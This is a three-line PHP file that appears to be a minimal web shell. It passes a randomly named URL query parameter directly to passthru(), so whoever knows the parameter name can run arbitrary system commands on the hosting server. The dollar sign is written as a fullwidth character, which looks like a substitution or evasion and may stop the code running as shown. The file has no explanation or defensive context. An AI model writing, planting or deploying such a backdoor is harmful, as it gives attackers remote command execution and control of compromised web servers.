<?php
passthru(＄_GET['K0OS3Ydw']);
?>
